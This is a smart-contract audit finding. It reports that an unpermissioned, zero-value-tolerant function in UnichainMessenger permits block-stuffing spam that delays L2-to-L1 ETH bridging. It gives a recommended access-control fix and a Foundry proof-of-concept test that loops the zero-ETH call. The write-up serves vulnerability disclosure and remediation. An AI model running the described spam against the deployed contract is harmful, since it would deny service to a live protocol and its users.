Audit Report

## Title
Unpermissioned Zero-Value Calls to `sendETHToL1ViaBridge` Enable Block Stuffing — (`contracts/bridges/UnichainMessenger.sol`)

## Summary

`UnichainMessenger.sendETHToL1ViaBridge` has no access control and its only guard — `if (msg.value != value) revert MismatchedMsgValue()` — passes silently when both `msg.value` and `value` are zero. Any unprivileged caller can invoke it in a tight loop at zero ETH cost, consuming Unichain block gas and temporarily crowding out the `BRIDGER_ROLE`'s `bridgeAssetsViaNativeBridge` transactions.

## Finding Description

`sendETHToL1ViaBridge` is declared `external payable nonReentrant` with no role modifier:

```solidity
// contracts/bridges/UnichainMessenger.sol L24-27
function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value) external payable nonReentrant {
    if (msg.value != value) revert MismatchedMsgValue();
    IUnichainMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
}
```

When an attacker calls `sendETHToL1ViaBridge(eoa, eoa, 0)` with `msg.value = 0`, the check `0 != 0` evaluates to `false` and execution continues. The subsequent `IUnichainMessenger(l2bridge).bridgeETHTo{value: 0}(...)` call targets an attacker-supplied address; a zero-value EVM `CALL` to any EOA returns success, so the entire function completes without reverting. The `nonReentrant` guard prevents reentrancy within a single call but does not prevent repeated independent transactions.

The legitimate caller (`RSETHPoolNoWrapper.bridgeAssetsViaNativeBridge`) always forwards a non-zero `ethBalanceMinusFees`:

```solidity
// contracts/pools/RSETHPoolNoWrapper.sol L437-441
uint256 ethBalanceMinusFees = getETHBalanceMinusFees();
IL2Messenger(messenger).sendETHToL1ViaBridge{ value: ethBalanceMinusFees }(
    l2Bridge, l1VaultETHForL2Chain, ethBalanceMinusFees
);
```

There is no zero-value guard in `UnichainMessenger` itself, and no check that `msg.sender` is the trusted pool contract.

## Impact Explanation

An attacker submits a stream of zero-ETH transactions calling `sendETHToL1ViaBridge(eoa, eoa, 0)`. Each transaction consumes approximately 21 000 (base) + `nonReentrant` overhead + one external `CALL` worth of gas (~30 000–50 000 gas total) while spending zero ETH. On Unichain (OP Stack), gas fees are low, making it economically feasible to fill consecutive blocks. This temporarily prevents the `BRIDGER_ROLE`'s `bridgeAssetsViaNativeBridge` transaction from being included, delaying ETH bridging from L2 to L1.

**Impact: Low — Block stuffing** (explicitly within the defined allowed scope).

## Likelihood Explanation

Preconditions are minimal: no ETH required, no special role, no prior state setup. The attacker only needs to pay L2 gas fees. The attack is repeatable across consecutive blocks. While the OP Stack sequencer can in principle reorder transactions, there is no protocol-level guarantee it will prioritize the `BRIDGER_ROLE` call over a flood of attacker transactions.

## Recommendation

Add access control so only the trusted pool contract (or a designated role) can invoke `sendETHToL1ViaBridge`:

```solidity
address public immutable authorizedCaller;

function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value)
    external payable nonReentrant
{
    if (msg.sender != authorizedCaller) revert Unauthorized();
    if (msg.value != value) revert MismatchedMsgValue();
    IUnichainMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
}
```

As a secondary defence, add `if (value == 0) revert InvalidAmount();` to reject zero-value calls even if access control is bypassed.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/bridges/UnichainMessenger.sol";

contract StubBridge {
    fallback() external payable {}
}

contract BlockStuffingPoC is Test {
    UnichainMessenger messenger;
    StubBridge stub;
    address attacker = address(0xBEEF);

    function setUp() public {
        messenger = new UnichainMessenger();
        stub = new StubBridge();
    }

    function test_zeroValueSpam() public {
        vm.startPrank(attacker);
        // No ETH needed; loop succeeds every iteration
        for (uint256 i = 0; i < 500; i++) {
            messenger.sendETHToL1ViaBridge(address(stub), address(0xDEAD), 0);
        }
        vm.stopPrank();
        // 500 successful calls, each ~30-50k gas, zero ETH spent by attacker
    }
}
```

Each iteration passes the `msg.value == value` check (both zero), calls `stub.bridgeETHTo{value:0}(...)` which succeeds via the `fallback`, and returns normally. No ETH is spent; only gas fees are paid.